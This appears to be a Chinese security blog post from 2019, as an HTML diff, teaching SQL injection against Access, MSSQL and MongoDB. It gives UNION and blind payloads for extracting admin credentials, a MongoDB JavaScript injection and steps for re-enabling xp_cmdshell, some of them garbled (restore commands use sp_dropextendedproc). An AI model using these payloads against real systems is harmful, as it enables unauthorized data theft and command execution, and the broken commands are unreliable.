@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="TuringGu" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>其它常用数据库注入 | TuringGu - Info Security</title>
+  </head>
+  <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">TuringGu</a></h1>
+        <h2 class="subtitle">Info Security</h2>
+      </div>
+      
+      <div class="logo">
+        <img src="/images/logo.png" alt="logo">
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/categories/">分类</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2019/01/08/Other-Database-Inject/">
+      <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="TuringGu">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/images/myavatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="TuringGu">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">其它常用数据库注入</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-01-08T14:29:03+08:00">2019-01-08 14:29:03</time></span>
+        </span>
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote>
+<p>Access 数据库是由微软发布的关联式数据库管理系统，主要用于存储数据、数据分析、开发软件<br>其最大的优点是：易学！不是学计算机专业的人员，也能学会。低成本地满足了那些从事企业管理工作的人员的管理需要，通过软件来规范同事、下属的行为，推行其管理思想。（.NET、VB、 C 语言等开发工具对于非计算机专业人员来说太难了，而 Access 则很容易） </p>
+</blockquote>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h4><ol>
+<li>猜解表名、列名后，使用ASCII编码的方式进行boos型注入</li>
+<li>通过猜解表名后，使用偏移注入爆出当前表所偶内容</li>
+<li>通过跨库查询，查询其它数据库中内容</li>
+</ol>
+<h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><p>eg:<br>admin表有id，user，passwd三列<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>;  <span class="hljs-comment"># 本查询查了三列</span><br>union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,* <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>;  <span class="hljs-comment"># 此处*代表三列</span><br><br><span class="hljs-comment"># 定义a、b两个表，都代表admin</span><br>(admin <span class="hljs-keyword">select</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">as</span> b);<br><br><span class="hljs-comment"># *代表：输出a表和b表并列后的top 1 (第一行)的内容</span><br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,* <span class="hljs-keyword">from</span> (<span class="hljs-keyword">admin</span> <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">and</span> a.id=b.id)<br></code></pre></td></tr></table></figure></p>
+<h4 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h4><p><code>select * from [路径].库名</code><br>eg:<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">("<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> SqlIn(Sqlin_IP,SqlIn_Web,SqlIn_FS,SqlIn_CS,SqlIn_SJ) <span class="hljs-keyword">values</span>(<span class="hljs-string">'"&amp;Request.ServerVariables("REMOTE_ADDR")&amp;"'</span>,<span class="hljs-string">'"$Request.ServerVariables("URL")&amp;"'</span>,<span class="hljs-string">'POST'</span>,<span class="hljs-string">'"&amp;replace(Request.Form(Fy_Post),"'</span><span class="hljs-string">","</span><span class="hljs-string">'")&amp;"'</span>)<span class="hljs-string">")<br><br>&amp;=1"</span><span class="hljs-string">')") and union select 1,2,3 from news #</span><br></code></pre></td></tr></table></figure></p>
+<h3 id="注入范例"><a href="#注入范例" class="headerlink" title="注入范例"></a>注入范例</h3><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">order by 3    <span class="hljs-comment"># 猜查询列数</span><br>union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>    <span class="hljs-comment"># 猜表</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,pass,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>    <span class="hljs-comment"># 猜列</span><br><br><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)    <span class="hljs-comment"># 猜表</span><br><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)    <span class="hljs-comment"># 猜列</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">len</span>(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)&gt;<span class="hljs-number">0</span>    <span class="hljs-comment"># 猜列长</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(<span class="hljs-keyword">mid</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)&gt;<span class="hljs-number">97</span>    <span class="hljs-comment"># 猜列名</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(<span class="hljs-keyword">mid</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)=<span class="hljs-number">97</span><br></code></pre></td></tr></table></figure>
+<hr>
+<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><blockquote>
+<p>ms SQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server一开始并不是微软自己研发的产品，而是当时为了要和IBM竞争时，与Sybase合作所产生的，其最早的发展者是Sybase，同时微软也和Sybase合作过 SQL Server 4.2版本的研发，微软亦将SQL Server 4.2移植到Windows NT（当时为3.1版），在与Sybase终止合作关系后，自力开发出SQL Server 6.0版，往后的SQL Server即均由微软自行研发。</p>
+</blockquote>
+<hr>
+<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><h4 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h4><ul>
+<li><strong>服务器角色</strong>：针对运行整个数据库服务器设定的角色和权限</li>
+<li><strong>数据库角色</strong>：针对某个特定数据库设定的角色和权限</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>固定服务器角色</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sysadmin</td>
+<td>可以在SQL Server中执行任何活动</td>
+</tr>
+<tr>
+<td>serveradmin</td>
+<td>可以设置服务器范围的配置选项，关闭服务器</td>
+</tr>
+<tr>
+<td>setupadmin</td>
+<td>可以管理链接服务器和启动过程，并执行某些系统存储过程(如：sp_serveroption)</td>
+</tr>
+<tr>
+<td>securityadmin</td>
+<td>可以管理登录和CREATE、DATABASE权限，还可读取错误日志和更改密码</td>
+</tr>
+<tr>
+<td>processadmin</td>
+<td>可以管理在SQL Server实例中运行的进程</td>
+</tr>
+<tr>
+<td>dbcreator</td>
+<td>可以创建、更改和除去数据库</td>
+</tr>
+<tr>
+<td>diskadmin</td>
+<td>可以管理磁盘文件</td>
+</tr>
+<tr>
+<td>bulkadmin</td>
+<td>可以执行BULK INSERT语句</td>
+</tr>
+</tbody>
+</table>
+<p>判断当前服务器角色<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>);<br></code></pre></td></tr></table></figure></p>
+<hr>
+<table>
+<thead>
+<tr>
+<th><strong>固定数据库角色</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>db_owner</td>
+<td>在数控中有全部权限</td>
+</tr>
+<tr>
+<td>db_accessadmin</td>
+<td>可以添加或删除用户ID</td>
+</tr>
+<tr>
+<td>db_securityadmin</td>
+<td>可以管理全部权限、对象所有权、角色和角色成员资格</td>
+</tr>
+<tr>
+<td>db_ddladmin</td>
+<td>可以发出ALL DDL，但不能发出GRANT、REVOKE或DENY语句</td>
+</tr>
+<tr>
+<td>db_backupoperator</td>
+<td>可以发出DBCC、CHECKPOINT和BACKUP语句</td>
+</tr>
+<tr>
+<td>db_datareader</td>
+<td>可以选择数据库内任何用户表中的所有数据</td>
+</tr>
+<tr>
+<td>db_datawriter</td>
+<td>可以更改数据库内任何用户表中的所有数据</td>
+</tr>
+<tr>
+<td>db_denydatareader</td>
+<td>不能选择数据库内任何用户表中的所有数据</td>
+</tr>
+<tr>
+<td>db_denydatawriter</td>
+<td>不能更改数据库内任何用户表中的所有数据</td>
+</tr>
+</tbody>
+</table>
+<p>判断当前数据库角色<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> is_member(<span class="hljs-string">'db_owner'</span>);<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="扩展存储过程"><a href="#扩展存储过程" class="headerlink" title="扩展存储过程"></a>扩展存储过程</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>扩展存储过程是MsSQL提供的特殊功能。所谓“扩展存储过程”，其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能。</p>
+<hr>
+<h4 id="常见利用方法"><a href="#常见利用方法" class="headerlink" title="常见利用方法"></a>常见利用方法</h4><p>在SQL注入攻击过程中，最常利用到的扩展存储见下表：</p>
+<table>
+<thead>
+<tr>
+<th><strong>存储过程</strong></th>
+<th><strong>利用方法</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>xp_cmdshell</td>
+<td>直接执行系统命令</td>
+</tr>
+<tr>
+<td>xp_regread</td>
+<td>注册表读取</td>
+</tr>
+<tr>
+<td>xp_regwrite</td>
+<td>写入注册表</td>
+</tr>
+<tr>
+<td>xp_dirtre</td>
+<td>列目录操作</td>
+</tr>
+<tr>
+<td>xp_enumds</td>
+<td>ODBC连接</td>
+</tr>
+<tr>
+<td>xp_loginconfig</td>
+<td>配置服务器安全模式信息</td>
+</tr>
+<tr>
+<td>xp_makecab</td>
+<td>创建压缩卷</td>
+</tr>
+<tr>
+<td>xp_ntsec_enumdomains</td>
+<td>查看domain信息</td>
+</tr>
+<tr>
+<td>xp_terminate_jroces</td>
+<td>查看终端进程，给出一个进程PID</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="检测与恢复扩展存储"><a href="#检测与恢复扩展存储" class="headerlink" title="检测与恢复扩展存储"></a>检测与恢复扩展存储</h4><p>提交如下查询进行检测，查看xp_cmdshell扩展存储过程是否被删除<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and 1=(<span class="hljs-keyword">Select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">FROM</span> master.dbo.sysobjects <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">name</span>=<span class="hljs-string">'xp_cmdshell'</span>)<br></code></pre></td></tr></table></figure></p>
+<p>若扩展存储被删除，可执行如下查询进行恢复<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;exec sp_dropextendedproc 'xp_cmdshell'<br></code></pre></td></tr></table></figure></p>
+<p>上诉一条查询语句，是在恢复前先删除xp_cmdshell，以后再在后面重新进行创建，随后执行如下查询<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;exec sp_dropextendedproc 'xp_cmdshell','xsql70.dll'<br></code></pre></td></tr></table></figure></p>
+<p>该语句利用系统中默认的<code>xsql70.dll</code>文件，自动恢复xp_cmdshell，若恢复失败，则说明该文件已被改名或删除，可以上传一个<code>xsql70.dll</code>文件，自定义路径进行恢复。例如执行如下查询语句<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;exec sp_dropextendedproc 'xp_cmdshell','c:\xsql70.dll'<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><blockquote>
+<p>MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。<br>MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。</p>
+</blockquote>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>属于nosql，没有库、表结构，只有对应关系</p>
+<hr>
+<h3 id="一些用法"><a href="#一些用法" class="headerlink" title="一些用法"></a>一些用法</h3><p>注入的一些例子<br><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">$id=1'&#125;);return (&#123;title:tojson(<br>db.Authority_confidential.find()[1]),2:'1'&#125;);<br><br>db.notice.findOne(&#123;'id':'$id'&#125;);<br>return(&#123;title:tojson(db.Authority_confidential.find()[1]),2:'1'&#125;);<br></code></pre></td></tr></table></figure></p>
+<p>一些变量含义：<br>$gt ——- greater than &gt;<br>$gte —— gt equal &gt;=<br>$lt ——— less than &lt;<br>$lte ——– lt equal &lt;=<br>$ne ——— not equal !=<br>$eq ——— equal =</p>
+<hr>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="http://www.makaidong.com/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E9%97%AE%E7%AD%94/11237.shtml" target="_blank" rel="noopener">http://www.makaidong.com/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E9%97%AE%E7%AD%94/11237.shtml</a></p>
+<p>mssql/oracle<br>优点：适用于大型网络，适合分级管理<br>缺点：庞大，系统复杂</p>
+<p>access、mssql使用工具首选穿山甲(pangolin)</p>
+<p>渗透篇03-SQL Injection漏洞详解–手工挖掘（SQL server篇）<br><a href="https://blog.csdn.net/qq_38055050/article/details/79953652" target="_blank" rel="noopener">https://blog.csdn.net/qq_38055050/article/details/79953652</a></p>
+
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/Access/" rel="tag"><i class="fas fa-tags"></i>Access</a>
+        
+        <a class="post-tag button" href="/tags/MSSQL/" rel="tag"><i class="fas fa-tags"></i>MSSQL</a>
+        
+        <a class="post-tag button" href="/tags/MongoDB/" rel="tag"><i class="fas fa-tags"></i>MongoDB</a>
+        
+        <a class="post-tag button" href="/tags/Injection/" rel="tag"><i class="fas fa-tags"></i>Injection</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+<div class="reward" id="reward">
+  <p>您的支持是我前进的动力！</p>
+  <button id="reward-button" class="button" disable="enable">打赏</button>
+  <div id="qr" class="qr" style="display: none;" aria-hidden="true">
+    
+    
+    
+  </div>
+</div>
+
+
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/2019/01/01/SQL-injection/" rel="next" title="SQL注入"><i class="fas fa-angle-left"></i><span class="nav-title">SQL注入</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/2019/01/09/WAF_Passby/" rel="prev" title="WAF绕过"><span class="nav-title">WAF绕过</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/myavatar.jpg" alt="TuringGu">
+  
+  <h1 class="author-name">TuringGu</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">38</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="categories-count">
+      <div class="site-count-title">分类</div>
+      <div><a href="/categories/">0</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">73</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Access"><span class="toc-text">Access</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#注入"><span class="toc-text">注入</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#基本流程"><span class="toc-text">基本流程</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#偏移注入"><span class="toc-text">偏移注入</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#跨库查询"><span class="toc-text">跨库查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#注入范例"><span class="toc-text">注入范例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#MSSQL"><span class="toc-text">MSSQL</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#简介-1"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#权限"><span class="toc-text">权限</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#角色"><span class="toc-text">角色</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#扩展存储过程"><span class="toc-text">扩展存储过程</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#定义"><span class="toc-text">定义</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#常见利用方法"><span class="toc-text">常见利用方法</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#检测与恢复扩展存储"><span class="toc-text">检测与恢复扩展存储</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#MongoDB"><span class="toc-text">MongoDB</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#简介-2"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#特点"><span class="toc-text">特点</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#一些用法"><span class="toc-text">一些用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#补充"><span class="toc-text">补充</span></a></li></ol></div>
+    </div>
+    
+    
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>友情链接</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://github.com/TuringGu" target="_blank">GitHub</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">TuringGu</span><span class="year"><i class="far fa-copyright"></i>2018 - 2019</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">BY-NC-ND 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
